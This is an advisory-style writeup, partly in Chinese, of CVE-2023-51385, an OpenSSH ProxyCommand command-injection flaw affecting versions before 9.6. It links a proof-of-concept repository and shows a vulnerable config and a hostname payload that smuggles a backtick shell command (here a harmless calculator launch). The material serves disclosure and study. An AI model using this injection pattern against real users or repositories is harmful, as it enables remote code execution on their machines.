# CVE-2023-51385

>   OpenSSH是SSH 协议的免费开源实现。SSH协议族可以用来进行远程控制， 或在计算机之间传送文件。

**RCE via insecure `~/.ssh/config`**

Use of tokens like %h, %p in `ProxyCommand` is quite popular to use tunnels and connection proxying using SSH.

## 来源

[https://github.com/vin01/poc-proxycommand-vulnerable](https://github.com/vin01/poc-proxycommand-vulnerable)

## 简介

由于OpenSSH中的ProxyCommand命令中未对%h，%p表示的用户名和主机名输入进行安全过滤，导致当攻击者可以控制%h,%p值时可以注入恶意Shell字符进行命令注入攻击。

## 影响范围

-   OpenSSH < 9.6

## 漏洞类型

命令注入

## POC

### Vulnerable config

```
host *.example.com
  ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p
```

Note: in my initial assessment I was under the impression that using '%h` (single quotes) would avoid this, but looks like that is still going to be vulnerable with something like:

```
url = ssh://'`open -aCalculator`'foo.example.com/bar
```

Taken from: https://man.openbsd.org/ssh_config#ProxyCommand

### What is in this repository

A submodule which would exploit this vulnerability to pop a calculator on OSX.

Try it out using:

`git clone https://github.com/vin01/poc-proxycommand-vulnerable --recurse-submodules`

or

`git clone git@github.com:vin01/poc-proxycommand-vulnerable.git --recurse-submodules`
